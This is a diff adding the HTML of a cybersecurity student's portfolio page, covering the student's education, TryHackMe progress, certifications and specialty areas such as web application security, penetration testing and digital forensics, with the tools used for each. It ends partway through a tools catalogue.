@@ -1,0 +1,1786 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Bhakta Sharma | Aspiring Penetration Tester &amp; Cybersecurity Researcher</title>
+<meta name="description" content="Bhakta Sharma (BHAKTASEC) is an aspiring cybersecurity researcher and penetration tester studying Computer Science and Engineering. Web application security, reconnaissance, digital forensics, projects, CTF writeups and certifications.">
+<meta name="theme-color" content="#1A1818">
+<link rel="canonical" href="https://bhaktabsharma.github.io/Portfolio/">
+<meta name="author" content="Bhakta Sharma">
+<meta name="robots" content="index, follow">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="BHAKTASEC">
+<meta property="og:locale" content="en_IN">
+<meta property="og:title" content="Bhakta Sharma | Aspiring Penetration Tester &amp; Cybersecurity Researcher">
+<meta property="og:description" content="Web application security, penetration testing, reconnaissance and digital forensics: projects, writeups and certifications from an aspiring cybersecurity researcher.">
+<meta property="og:image" content="https://bhaktabsharma.github.io/Portfolio/assets/og-image.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:image:alt" content="BHAKTASEC: Bhakta Sharma, aspiring penetration tester and cybersecurity researcher">
+<meta property="og:url" content="https://bhaktabsharma.github.io/Portfolio/">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Bhakta Sharma | Aspiring Penetration Tester &amp; Cybersecurity Researcher">
+<meta name="twitter:image" content="https://bhaktabsharma.github.io/Portfolio/assets/og-image.png">
+<link rel="icon" type="image/svg+xml" href="assets/favicon.svg">
+<link rel="icon" type="image/png" sizes="32x32" href="assets/favicon-32.png">
+<link rel="apple-touch-icon" href="assets/apple-touch-icon.png">
+<link rel="preload" href="assets/fonts/onest-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="stylesheet" href="css/style.css">
+<script>document.documentElement.classList.add('js');setTimeout(function(){document.documentElement.classList.add('reveal-all','is-ready')},5000);</script>
+<noscript><style>.loader{display:none!important}</style></noscript>
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"Person","name":"Bhakta Sharma","alternateName":"BHAKTASEC","url":"https://bhaktabsharma.github.io/Portfolio/","jobTitle":"Aspiring Penetration Tester and Cybersecurity Researcher","description":"Computer Science and Engineering student focused on web application security, penetration testing, reconnaissance and digital forensics.","address":{"@type":"PostalAddress","addressLocality":"Siliguri","addressRegion":"West Bengal","addressCountry":"IN"},"knowsAbout":["Web application security","Penetration testing","Reconnaissance","Digital forensics","Bug bounty"],"sameAs":["https://github.com/bhaktabsharma","https://www.linkedin.com/in/bhaktabsharma/","https://tryhackme.com/p/bhaktabsharma","https://instagram.com/beingbhaktaaaaa"]}
+</script>
+</head>
+<body>
+
+<a class="skip" href="#main">Skip to content</a>
+
+<!-- Loader -->
+<div class="loader" id="loader" aria-hidden="true">
+  <div class="loader__inner">
+    <span class="loader__brand">BHAKTA<i>SEC</i></span>
+    <span class="loader__count"><b id="loaderNum">000</b></span>
+    <span class="loader__msg">Opening the case file</span>
+  </div>
+</div>
+
+<div class="cursor" id="cursor" aria-hidden="true"></div>
+<div class="progress" id="progress" aria-hidden="true"><i></i></div>
+
+<!-- Navigation -->
+<header class="nav" id="nav" aria-label="Site header">
+  <div class="nav__inner">
+    <a class="nav__logo" href="#hero" aria-label="BHAKTASEC, back to top">BHAKTA<span>SEC</span></a>
+    <nav class="nav__main" aria-label="Primary">
+      <ul class="nav__links" id="navLinks">
+        <li><a href="#hero" data-nav="hero">Home</a></li>
+        <li><a href="#about" data-nav="about">About</a></li>
+        <li><a href="#expertise" data-nav="expertise">Expertise</a></li>
+        <li><a href="#projects" data-nav="projects">Projects</a></li>
+        <li><a href="#writeups" data-nav="writeups">Writeups</a></li>
+        <li><a href="#tryhackme" data-nav="tryhackme">TryHackMe</a></li>
+        <li><a href="#github" data-nav="github">GitHub</a></li>
+        <li><a href="#certifications" data-nav="certifications">Certifications</a></li>
+        <li><a href="#contact" data-nav="contact">Contact</a></li>
+      </ul>
+      <span class="nav__ind" id="navInd" aria-hidden="true"></span>
+    </nav>
+    <div class="nav__actions">
+      <span class="nav__clock" data-clock aria-hidden="true"></span>
+      <a class="btn btn--ghost btn--sm" href="resume.html" target="_blank" rel="noopener">Resume</a>
+      <a class="btn btn--gold btn--sm" href="#contact">Hire Me</a>
+      <button class="burger" id="burger" type="button" aria-label="Open menu" aria-expanded="false" aria-controls="menu"><span></span><span></span></button>
+    </div>
+  </div>
+</header>
+
+<div class="menu" id="menu" aria-hidden="true" inert>
+  <div class="menu__inner">
+    <p class="menu__label">Menu</p>
+    <ol class="menu__list">
+      <li><a href="#hero" data-nav="hero" style="--i:0"><span>Home</span></a></li>
+      <li><a href="#about" data-nav="about" style="--i:1"><span>About</span></a></li>
+      <li><a href="#expertise" data-nav="expertise" style="--i:2"><span>Expertise</span></a></li>
+      <li><a href="#projects" data-nav="projects" style="--i:3"><span>Projects</span></a></li>
+      <li><a href="#writeups" data-nav="writeups" style="--i:4"><span>Writeups</span></a></li>
+      <li><a href="#tryhackme" data-nav="tryhackme" style="--i:5"><span>TryHackMe</span></a></li>
+      <li><a href="#github" data-nav="github" style="--i:6"><span>GitHub</span></a></li>
+      <li><a href="#certifications" data-nav="certifications" style="--i:7"><span>Certifications</span></a></li>
+      <li><a href="#contact" data-nav="contact" style="--i:8"><span>Contact</span></a></li>
+    </ol>
+    <div class="menu__foot">
+      <div class="menu__btns">
+        <a class="btn btn--ghost" href="resume.html" target="_blank" rel="noopener">Resume</a>
+        <a class="btn btn--gold" href="#contact">Hire Me</a>
+      </div>
+      <p class="menu__meta">Siliguri, West Bengal, India · <span data-clock></span></p>
+    </div>
+  </div>
+</div>
+
+<main id="main">
+
+<!-- ============ HERO ============ -->
+<section class="hero sec--dark" id="hero" aria-labelledby="heroTitle">
+  <div class="hero__bg" aria-hidden="true"><i class="hero__glow" data-parallax="0.12"></i><i class="hero__grid"></i></div>
+  <div class="wrap hero__layout">
+    <div class="hero__copy">
+      <p class="eyebrow" data-hero="0">Cybersecurity · Ethical Hacking · Digital Forensics</p>
+      <h1 class="hero__title" id="heroTitle">
+        <span class="mask"><span data-hero="1">Hi, I’m</span></span>
+        <span class="mask"><span data-hero="2">Bhakta Sharma.</span></span>
+      </h1>
+      <p class="hero__role" data-hero="3">Aspiring Penetration Tester / Cybersecurity Researcher / Bug Bounty Learner.</p>
+      <p class="hero__lede" data-hero="4">I explore attack surfaces, investigate vulnerabilities, build security tools and study how systems fail. My focus is web application security, penetration testing, reconnaissance and digital forensics.</p>
+      <div class="hero__cta" data-hero="5">
+        <a class="btn btn--gold" href="#projects">View My Work <span aria-hidden="true">→</span></a>
+        <a class="btn btn--ghost" href="#contact">Get In Touch</a>
+      </div>
+      <ul class="hero__facts" data-hero="6">
+        <li class="avail"><span class="pulse" aria-hidden="true"></span>Open to opportunities</li>
+        <li>Siliguri, West Bengal, India · <span data-clock></span></li>
+        <li>B.Tech CSE student · working toward CEH v12 and CHFI</li>
+      </ul>
+    </div>
+
+    <div class="hero__card" data-hero="3">
+      <div class="idcard" id="idcard">
+        <span class="idcard__slot" aria-hidden="true"></span>
+        <div class="idcard__head">
+          <span class="idcard__brand">BHAKTASEC</span>
+          <span class="idcard__tag">operator id · bhaktabsharma</span>
+        </div>
+        <div class="term" role="group" aria-label="Interactive terminal">
+          <div class="term__bar">
+            <span class="dots" aria-hidden="true"><i></i><i></i><i></i></span>
+            <span class="term__title">bhakta@security: ~</span>
+            <span class="term__live"><i aria-hidden="true"></i>session</span>
+          </div>
+          <div class="term__screen">
+            <div class="term__body" id="termBody" role="log" aria-live="off" aria-label="Terminal output"></div>
+          </div>
+          <div class="term__cmds" role="group" aria-label="Run a command">
+            <button type="button" data-cmd="whoami">whoami</button>
+            <button type="button" data-cmd="skills">skills</button>
+            <button type="button" data-cmd="projects">projects</button>
+            <button type="button" data-cmd="contact">contact</button>
+            <button type="button" data-cmd="help">help</button>
+            <button type="button" data-cmd="clear">clear</button>
+          </div>
+        </div>
+        <ul class="idcard__status" aria-label="System status">
+          <li><i class="led led--on" aria-hidden="true"></i><span>shell</span><b>bash</b></li>
+          <li><i class="led led--gold" aria-hidden="true"></i><span>scope</span><b>authorised only</b></li>
+          <li><i class="led led--on" aria-hidden="true"></i><span>status</span><b>open to work</b></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+  <a class="hero__scroll" href="#about" data-hero="6"><span>Scroll to explore</span><i aria-hidden="true">↓</i></a>
+</section>
+
+<!-- ============ ABOUT / STORY ============ -->
+<section class="sec sec--ivory" id="about" aria-labelledby="aboutTitle">
+  <div class="wrap">
+    <header class="sec__head">
+      <p class="label" data-reveal>About</p>
+      <h2 class="sec__title" id="aboutTitle" data-split>Ethical hacker, shaped by an engineer’s habits.</h2>
+    </header>
+
+    <div class="about">
+      <div class="about__text" data-reveal>
+        <p class="lead">I’m Bhakta Sharma, an aspiring cybersecurity researcher focused on web application security, penetration testing, bug bounty hunting, reconnaissance and digital forensics.</p>
+        <p>I enjoy understanding how systems work, identifying security weaknesses, investigating technical problems and building tools that make security research more effective.</p>
+        <p>My journey combines academic learning with hands-on cybersecurity practice, independent projects and continuous exploration of application security. I practise on TryHackMe, build security tools and practice labs, and document what I learn in CTF writeups.</p>
+      </div>
+      <dl class="about__facts" data-reveal>
+        <div><dt>Based in</dt><dd>Siliguri, West Bengal, India</dd></div>
+        <div><dt>Studying</dt><dd>B.Tech in Computer Science and Engineering, AGEMC (pursuing)</dd></div>
+        <div><dt>Focus</dt><dd>Web application security, bug bounty learning, reconnaissance, digital forensics</dd></div>
+        <div><dt>Credentials</dt><dd>NVH Digital Forensic (Grade A+) · CEH v12 and CHFI in progress</dd></div>
+        <div><dt>Languages</dt><dd>English · Hindi · Nepali</dd></div>
+      </dl>
+    </div>
+
+    <div class="edu" id="education" data-reveal>
+      <div class="edu__head">
+        <p class="label">Education &amp; resume</p>
+        <h3 class="edu__title">Where I’m learning.</h3>
+      </div>
+      <ol class="edu__list">
+        <li class="edu__item edu__item--now">
+          <p class="edu__when">Pursuing · 3rd semester</p>
+          <h4>Bachelor of Technology, Computer Science and Engineering</h4>
+          <p class="edu__org">Alipurduar Government Engineering and Management College (AGEMC)</p>
+          <!-- EDIT: add the expected graduation year here once you want it shown -->
+        </li>
+        <li class="edu__item">
+          <p class="edu__when">2021 — 2024</p>
+          <h4>Diploma in Civil Engineering</h4>
+          <p class="edu__org">The engineering background behind my methodical approach to problems</p>
+          <!-- EDIT: add the institution name here -->
+        </li>
+        <li class="edu__item">
+          <p class="edu__when">2023 — Now</p>
+          <h4>Cybersecurity self-study</h4>
+          <p class="edu__org">TryHackMe labs · EC-Council study material · NVH Digital Forensic</p>
+        </li>
+      </ol>
+      <div class="edu__resume">
+        <p class="edu__note">Resume with education, tools, projects and certifications. The PDF and text versions are plain, single-column and ATS-friendly.</p>
+        <div class="edu__btns">
+          <a class="btn btn--dark" href="resume.html" target="_blank" rel="noopener">View resume</a>
+          <a class="btn btn--gold" href="assets/Bhakta-Sharma-Resume.pdf" download="Bhakta-Sharma-Resume.pdf">Download PDF</a>
+          <a class="btn btn--outline" href="assets/Bhakta-Sharma-Resume.txt" download="Bhakta-Sharma-Resume.txt">Plain text (ATS)</a>
+        </div>
+      </div>
+    </div>
+
+    <div class="story" id="story">
+      <div class="story__aside">
+        <div class="story__sticky">
+          <p class="label">My story</p>
+          <h3 class="story__lead">Let’s go back in time.</h3>
+          <div class="story__date" id="storyDate" aria-live="polite">2021 — 2024</div>
+          <div class="story__meta">
+            <span class="story__count"><b id="storyIdx">01</b> / <span id="storyTotal">07</span></span>
+            <span class="story__bar" aria-hidden="true"><i id="storyBar"></i></span>
+            <span class="story__nav">
+              <button type="button" id="storyPrev" aria-label="Previous chapter">←</button>
+              <button type="button" id="storyNext" aria-label="Next chapter">→</button>
+            </span>
+          </div>
+        </div>
+      </div>
+      <ol class="story__list" id="storyList">
+        <li class="story__item" data-when="2021 — 2024">
+          <p class="story__when">2021 — 2024</p>
+          <h4>Diploma in Civil Engineering</h4>
+          <p class="story__org">Where the methodical mindset started</p>
+          <ul>
+            <li>Studied civil engineering, learning to break a big structure into parts and check each one.</li>
+            <li>That systematic approach is what I now apply to breaking down security problems.</li>
+          </ul>
+        </li>
+        <li class="story__item" data-when="Pursuing">
+          <p class="story__when">Pursuing</p>
+          <h4>B.Tech, Computer Science and Engineering</h4>
+          <p class="story__org">Alipurduar Government Engineering and Management College (AGEMC)</p>
+          <ul>
+            <li>Currently in the 3rd semester, building the computing foundations behind security work.</li>
+            <li>Academic study runs alongside hands-on labs, projects and certification preparation.</li>
+          </ul>
+        </li>
+        <li class="story__item" data-when="2023 — Now">
+          <p class="story__when">2023 — Now</p>
+          <h4>Self-study: cybersecurity</h4>
+          <p class="story__org">TryHackMe · EC-Council</p>
+          <ul>
+            <li>Moved from engineering into computing and security through structured self-study and hands-on labs.</li>
+            <li>Studied digital forensics across 19 modules, from file systems and acquisition to malware forensics, incident response and cloud DFIR.</li>
+          </ul>
+        </li>
+        <li class="story__item" data-when="2024">
+          <p class="story__when">2024</p>
+          <h4>TryHackMe learning paths</h4>
+          <p class="story__org">Jr Penetration Tester · SOC Level 1</p>
+          <ul>
+            <li>Completed the Jr Penetration Tester and SOC Level 1 learning paths.</li>
+            <li>Red Teaming and Cyber Defence paths are in progress.</li>
+          </ul>
+        </li>
+        <li class="story__item" data-when="8 Jun 2026">
+          <p class="story__when">8 Jun 2026</p>
+          <h4>NVH Digital Forensic, Grade A+</h4>
+          <p class="story__org">NewVersionHacker · 3-month program</p>
+          <ul>
+            <li>Completed a structured digital forensics program with a Grade A+, covering evidence handling and investigation from intake to report.</li>
+            <li>Certificate valid through June 2028.</li>
+          </ul>
+        </li>
+        <li class="story__item" data-when="12 Jun 2026">
+          <p class="story__when">12 Jun 2026</p>
+          <h4>Ethical Hacking 101: Beginners Guide</h4>
+          <p class="story__org">Simplilearn SkillUP · online course certificate</p>
+          <ul>
+            <li>Earned the certificate covering the ethical hacking mindset, terminology and methodology.</li>
+          </ul>
+        </li>
+        <li class="story__item" data-when="Now">
+          <p class="story__when">Now</p>
+          <h4>Research, tools and open source</h4>
+          <p class="story__org">Independent security research</p>
+          <ul>
+            <li>Publishing security tools and practice labs on GitHub, led by the Bug Bounty Recon Engine.</li>
+            <li>TryHackMe Top 1% globally, 200+ rooms and a 250+ day streak (profile snapshot).</li>
+            <li>Working toward the EC-Council CEH v12 and CHFI certifications (in progress, not yet earned).</li>
+          </ul>
+        </li>
+      </ol>
+    </div>
+  </div>
+</section>
+
+<!-- ============ EXPERTISE: DOORS ============ -->
+<section class="sec sec--charcoal doors-sec" id="expertise" aria-labelledby="expTitle">
+  <div class="wrap">
+    <header class="sec__head sec__head--split">
+      <div>
+        <p class="label" data-reveal>Expertise</p>
+        <h2 class="sec__title" id="expTitle" data-split>My work, one door per specialty.</h2>
+      </div>
+      <p class="sec__sub" data-reveal>Open a door to see what sits behind it: the approach, the tools and the work that backs it up. <span class="only-touch">Swipe along the wall.</span></p>
+    </header>
+  </div>
+  <div class="wall" id="wall" data-reveal>
+    <div class="wall__track" id="wallTrack">
+      <article class="door" id="door-web" data-door="web" style="--door:#6B4F4F;--door-ink:#E8E4E0;--door-line:rgba(232,228,224,.2)">
+        <button class="door__leaf" type="button" aria-expanded="false" aria-controls="room-web">
+          <span class="door__code">web-app-sec</span>
+          <svg class="door__icon" viewBox="0 0 64 64" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="8" y="12" width="48" height="40" rx="4"/><path d="M8 22h48"/><circle cx="14" cy="17" r="1.2" fill="currentColor"/><circle cx="19" cy="17" r="1.2" fill="currentColor"/><path d="M26 33l-6 5 6 5M38 33l6 5-6 5M34 31l-4 14"/></svg>
+          <span class="door__name">Web Application Security</span>
+          <span class="door__open">Open the door</span>
+          <span class="door__knob" aria-hidden="true"></span>
+        </button>
+        <div class="door__room" id="room-web" role="region" aria-label="Web Application Security" inert>
+          <div class="door__roomin">
+            <button class="door__close" type="button" aria-label="Close Web Application Security door">Close</button>
+            <svg class="door__ghost" viewBox="0 0 64 64" fill="none" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="8" y="12" width="48" height="40" rx="4"/><path d="M8 22h48"/><circle cx="14" cy="17" r="1.2" fill="currentColor"/><circle cx="19" cy="17" r="1.2" fill="currentColor"/><path d="M26 33l-6 5 6 5M38 33l6 5-6 5M34 31l-4 14"/></svg>
+            <p class="door__code door__code--room">web-app-sec</p>
+            <h3 class="door__title">Web Application Security</h3>
+            <p class="door__desc">Studying web vulnerabilities such as injection, XSS, broken access control and logic flaws, and building local practice labs so every technique can be tried safely.</p>
+            <p class="door__sub">Tools</p>
+            <ul class="chips"><li><button type="button" class="chip" data-tool="burp">Burp Suite</button></li><li><button type="button" class="chip" data-tool="sqlmap">SQLMap</button></li><li><button type="button" class="chip" data-tool="zap">OWASP ZAP</button></li><li><button type="button" class="chip" data-tool="nikto">Nikto</button></li><li><button type="button" class="chip" data-tool="gobuster">Gobuster</button></li></ul>
+            <p class="door__sub">Related work</p>
+            <ul class="rels"><li><a href="#project-sqlilab" class="rel">SQL Injection Practice Lab<i aria-hidden="true">→</i></a></li><li><a href="#project-xsslab" class="rel">XSS Bugs Lab<i aria-hidden="true">→</i></a></li><li><a href="#project-faultline" class="rel">Faultline — Local Web Hacking Lab<i aria-hidden="true">→</i></a></li></ul>
+          </div>
+        </div>
+      </article>
+      <article class="door" id="door-pentest" data-door="pentest" style="--door:#2A2220;--door-ink:#E8E4E0;--door-line:rgba(214,178,110,.35)">
+        <button class="door__leaf" type="button" aria-expanded="false" aria-controls="room-pentest">
+          <span class="door__code">pentest</span>
+          <svg class="door__icon" viewBox="0 0 64 64" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="32" cy="32" r="20"/><circle cx="32" cy="32" r="11"/><circle cx="32" cy="32" r="2.6" fill="currentColor"/><path d="M32 6v10M32 48v10M6 32h10M48 32h10"/></svg>
+          <span class="door__name">Penetration Testing</span>
+          <span class="door__open">Open the door</span>
+          <span class="door__knob" aria-hidden="true"></span>
+        </button>
+        <div class="door__room" id="room-pentest" role="region" aria-label="Penetration Testing" inert>
+          <div class="door__roomin">
+            <button class="door__close" type="button" aria-label="Close Penetration Testing door">Close</button>
+            <svg class="door__ghost" viewBox="0 0 64 64" fill="none" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="32" cy="32" r="20"/><circle cx="32" cy="32" r="11"/><circle cx="32" cy="32" r="2.6" fill="currentColor"/><path d="M32 6v10M32 48v10M6 32h10M48 32h10"/></svg>
+            <p class="door__code door__code--room">pentest</p>
+            <h3 class="door__title">Penetration Testing</h3>
+            <p class="door__desc">Practising the penetration-testing workflow in lab environments: enumeration, exploitation, privilege escalation on Linux and Windows, and Active Directory attacks.</p>
+            <p class="door__sub">Tools</p>
+            <ul class="chips"><li><button type="button" class="chip" data-tool="nmap">Nmap</button></li><li><button type="button" class="chip" data-tool="metasploit">Metasploit Framework</button></li><li><button type="button" class="chip" data-tool="hydra">Hydra</button></li><li><button type="button" class="chip" data-tool="johnripper">John the Ripper</button></li><li><button type="button" class="chip" data-tool="hashcat">Hashcat</button></li><li><button type="button" class="chip" data-tool="bloodhound">BloodHound</button></li><li><button type="button" class="chip" data-tool="mimikatz">Mimikatz</button></li><li><button type="button" class="chip" data-tool="kali">Kali Linux</button></li></ul>
+            <p class="door__sub">Related work</p>
+            <ul class="rels"><li><a href="#project-reconkit" class="rel">Automated Recon &amp; Enumeration Toolkit v2.0<i aria-hidden="true">→</i></a></li><li><button type="button" class="rel" data-writeup="adpen">AD Penetration<i aria-hidden="true">→</i></button></li><li><button type="button" class="rel" data-writeup="blue">Blue<i aria-hidden="true">→</i></button></li></ul>
+          </div>
+        </div>
+      </article>
+      <article class="door" id="door-recon" data-door="recon" style="--door:#E9E6DF;--door-ink:#1A1818;--door-line:rgba(26,24,24,.2)">
+        <button class="door__leaf" type="button" aria-expanded="false" aria-controls="room-recon">
+          <span class="door__code">bug-bounty-recon</span>
+          <svg class="door__icon" viewBox="0 0 64 64" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="32" cy="32" r="22"/><circle cx="32" cy="32" r="14"/><circle cx="32" cy="32" r="6"/><path d="M32 32L50 17"/><circle cx="44" cy="41" r="2.2" fill="currentColor"/><circle cx="21" cy="22" r="2.2" fill="currentColor"/></svg>
+          <span class="door__name">Bug Bounty &amp; Reconnaissance</span>
+          <span class="door__open">Open the door</span>
+          <span class="door__knob" aria-hidden="true"></span>
+        </button>
+        <div class="door__room" id="room-recon" role="region" aria-label="Bug Bounty &amp; Reconnaissance" inert>
+          <div class="door__roomin">
+            <button class="door__close" type="button" aria-label="Close Bug Bounty &amp; Reconnaissance door">Close</button>
+            <svg class="door__ghost" viewBox="0 0 64 64" fill="none" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="32" cy="32" r="22"/><circle cx="32" cy="32" r="14"/><circle cx="32" cy="32" r="6"/><path d="M32 32L50 17"/><circle cx="44" cy="41" r="2.2" fill="currentColor"/><circle cx="21" cy="22" r="2.2" fill="currentColor"/></svg>
+            <p class="door__code door__code--room">bug-bounty-recon</p>
+            <h3 class="door__title">Bug Bounty &amp; Reconnaissance</h3>
+            <p class="door__desc">Turning a single domain into a structured attack-surface map: subdomains, live hosts, ports, URLs, parameters and exposed files, automated where it can be and documented where it cannot.</p>
+            <p class="door__sub">Tools</p>
+            <ul class="chips"><li><button type="button" class="chip" data-tool="reconng">Recon-ng</button></li><li><button type="button" class="chip" data-tool="maltego">Maltego</button></li><li><button type="button" class="chip" data-tool="osint">OSINT Framework</button></li><li><button type="button" class="chip" data-tool="gobuster">Gobuster</button></li><li><button type="button" class="chip" data-tool="nmap">Nmap</button></li><li><span class="chip chip--static">subfinder</span></li><li><span class="chip chip--static">httpx</span></li><li><span class="chip chip--static">katana</span></li><li><span class="chip chip--static">ffuf</span></li><li><span class="chip chip--static">nuclei</span></li></ul>
+            <p class="door__sub">Related work</p>
+            <ul class="rels"><li><a href="#project-bbrecon" class="rel">Bug Bounty Recon Engine<i aria-hidden="true">→</i></a></li><li><a href="#project-reconql" class="rel">ReconQL — Dorking &amp; Recon Search Engine<i aria-hidden="true">→</i></a></li><li><a href="#project-crawlspace" class="rel">Crawlspace — Attack Surface Discovery<i aria-hidden="true">→</i></a></li></ul>
+          </div>
+        </div>
+      </article>
+      <article class="door" id="door-dfir" data-door="dfir" style="--door:#D6B26E;--door-ink:#1A1818;--door-line:rgba(26,24,24,.25)">
+        <button class="door__leaf" type="button" aria-expanded="false" aria-controls="room-dfir">
+          <span class="door__code">digital-forensics</span>
+          <svg class="door__icon" viewBox="0 0 64 64" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><ellipse cx="26" cy="19" rx="16" ry="6"/><path d="M10 19v10c0 3.3 7.2 6 16 6M10 29v10c0 3.3 7.2 6 16 6"/><circle cx="43" cy="41" r="10"/><path d="M50.5 48.5L58 56"/></svg>
+          <span class="door__name">Digital Forensics &amp; DFIR</span>
+          <span class="door__open">Open the door</span>
+          <span class="door__knob" aria-hidden="true"></span>
+        </button>
+        <div class="door__room" id="room-dfir" role="region" aria-label="Digital Forensics &amp; DFIR" inert>
+          <div class="door__roomin">
+            <button class="door__close" type="button" aria-label="Close Digital Forensics &amp; DFIR door">Close</button>
+            <svg class="door__ghost" viewBox="0 0 64 64" fill="none" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><ellipse cx="26" cy="19" rx="16" ry="6"/><path d="M10 19v10c0 3.3 7.2 6 16 6M10 29v10c0 3.3 7.2 6 16 6"/><circle cx="43" cy="41" r="10"/><path d="M50.5 48.5L58 56"/></svg>
+            <p class="door__code door__code--room">digital-forensics</p>
+            <h3 class="door__title">Digital Forensics &amp; DFIR</h3>
+            <p class="door__desc">Evidence handling, disk and memory analysis, network forensics and incident response, grounded in the NVH Digital Forensic certificate (Grade A+) and ongoing CHFI study.</p>
+            <p class="door__sub">Tools</p>
+            <ul class="chips"><li><button type="button" class="chip" data-tool="autopsy">Autopsy</button></li><li><button type="button" class="chip" data-tool="volatility">Volatility 3</button></li><li><button type="button" class="chip" data-tool="ftk">FTK Imager</button></li><li><button type="button" class="chip" data-tool="wireshark">Wireshark</button></li><li><button type="button" class="chip" data-tool="splunk">Splunk</button></li></ul>
+            <p class="door__sub">Related work</p>
+            <ul class="rels"><li><button type="button" class="rel" data-writeup="memfor">Memory Forensics<i aria-hidden="true">→</i></button></li><li><button type="button" class="rel" data-writeup="pcap">PCAP Analysis<i aria-hidden="true">→</i></button></li><li><button type="button" class="rel" data-writeup="cert-nvhdf">NVH Digital Forensic<i aria-hidden="true">→</i></button></li></ul>
+          </div>
+        </div>
+      </article>
+      <article class="door" id="door-malware" data-door="malware" style="--door:#120F0F;--door-ink:#E8E4E0;--door-line:rgba(214,178,110,.4)">
+        <button class="door__leaf" type="button" aria-expanded="false" aria-controls="room-malware">
+          <span class="door__code">malware-analysis</span>
+          <svg class="door__icon" viewBox="0 0 64 64" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><ellipse cx="32" cy="37" rx="12" ry="15"/><path d="M32 22v30M20 31l-10-5M20 41H8M21 50l-9 6M44 31l10-5M44 41h12M43 50l9 6M26 22c0-5 2-9 6-9s6 4 6 9"/><path d="M4 37h56" stroke-dasharray="3 4"/></svg>
+          <span class="door__name">Malware Analysis</span>
+          <span class="door__open">Open the door</span>
+          <span class="door__knob" aria-hidden="true"></span>
+        </button>
+        <div class="door__room" id="room-malware" role="region" aria-label="Malware Analysis" inert>
+          <div class="door__roomin">
+            <button class="door__close" type="button" aria-label="Close Malware Analysis door">Close</button>
+            <svg class="door__ghost" viewBox="0 0 64 64" fill="none" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><ellipse cx="32" cy="37" rx="12" ry="15"/><path d="M32 22v30M20 31l-10-5M20 41H8M21 50l-9 6M44 31l10-5M44 41h12M43 50l9 6M26 22c0-5 2-9 6-9s6 4 6 9"/><path d="M4 37h56" stroke-dasharray="3 4"/></svg>
+            <p class="door__code door__code--room">malware-analysis</p>
+            <h3 class="door__title">Malware Analysis</h3>
+            <p class="door__desc">Static and dynamic triage in lab settings: disassembling in Ghidra, fingerprinting and hunting with YARA, and watching behaviour in a sandbox, including memory and network artefacts.</p>
+            <p class="door__sub">Tools</p>
+            <ul class="chips"><li><button type="button" class="chip" data-tool="ghidra">Ghidra / IDA Pro</button></li><li><button type="button" class="chip" data-tool="yara">YARA</button></li><li><button type="button" class="chip" data-tool="volatility">Volatility 3</button></li><li><button type="button" class="chip" data-tool="wireshark">Wireshark</button></li></ul>
+            <p class="door__sub">Related work</p>
+            <ul class="rels"><li><button type="button" class="rel" data-writeup="rm-mal">Malware Analysis<i aria-hidden="true">→</i></button></li><li><button type="button" class="rel" data-writeup="memfor">Memory Forensics<i aria-hidden="true">→</i></button></li></ul>
+          </div>
+        </div>
+      </article>
+    </div>
+    <div class="wall__floor" aria-hidden="true"></div>
+  </div>
+</section>
+
+<!-- ============ TOOLS ============ -->
+<section class="sec sec--beige" id="tools" aria-labelledby="toolsTitle">
+  <div class="wrap">
+    <header class="sec__head sec__head--split">
+      <div>
+        <p class="label" data-reveal>Toolkit</p>
+        <h2 class="sec__title" id="toolsTitle" data-split>Tools and technologies.</h2>
+      </div>
+      <p class="sec__sub" data-reveal>Search or filter the catalogue. Select a tool for what it does, where it appears in my labs and writeups, and a link to its official documentation.</p>
+    </header>
+    <div class="tcontrols" data-reveal>
+      <div class="search">
+        <label class="sr-only" for="toolSearch">Search tools</label>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="11" cy="11" r="6.5"/><path d="M16 16l4.5 4.5"/></svg>
+        <input type="search" id="toolSearch" placeholder="Search tools, for example nmap, memory or SIEM" autocomplete="off" spellcheck="false" maxlength="60">
+        <button type="button" class="search__clear" id="toolClear" hidden aria-label="Clear search">✕</button>
+      </div>
+      <div class="fchips" role="group" aria-label="Filter tools by category"><button type="button" class="fchip is-on" data-tfilter="all" aria-pressed="true">All <i>26</i></button><button type="button" class="fchip" data-tfilter="Digital Forensics" aria-pressed="false">Digital Forensics <i>3</i></button><button type="button" class="fchip" data-tfilter="Network Security" aria-pressed="false">Network Security <i>5</i></button><button type="button" class="fchip" data-tfilter="Web Application Security" aria-pressed="false">Web Application Security <i>5</i></button><button type="button" class="fchip" data-tfilter="Penetration Testing" aria-pressed="false">Penetration Testing <i>10</i></button><button type="button" class="fchip" data-tfilter="Malware Analysis" aria-pressed="false">Malware Analysis <i>2</i></button><button type="button" class="fchip" data-tfilter="Programming and Automation" aria-pressed="false">Programming and Automation <i>1</i></button></div>
+      <p class="tcount" id="toolCount" role="status" aria-live="polite">26 tools</p>
+    </div>
+    <div id="toolGroups">
+    <div class="tgroup" data-reveal data-group="Digital Forensics">
+      <div class="tgroup__head"><h3>Digital Forensics</h3><span class="tgroup__n">3 tools</span></div>
